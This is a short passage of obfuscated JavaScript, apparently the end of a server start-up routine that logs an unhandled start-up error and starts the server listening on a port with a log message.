_0x22dbd7=_0x2d93c9;console[_0x22dbd7(0x12c)]('Unhandled\x20error\x20in\x20startserver:',_0x2f5518);}),app[_0x2d93c9(0x135)](PORT,()=>console[_0x2d93c9(0x15f)](_0x2d93c9(0x1bc)+PORT+'!'));
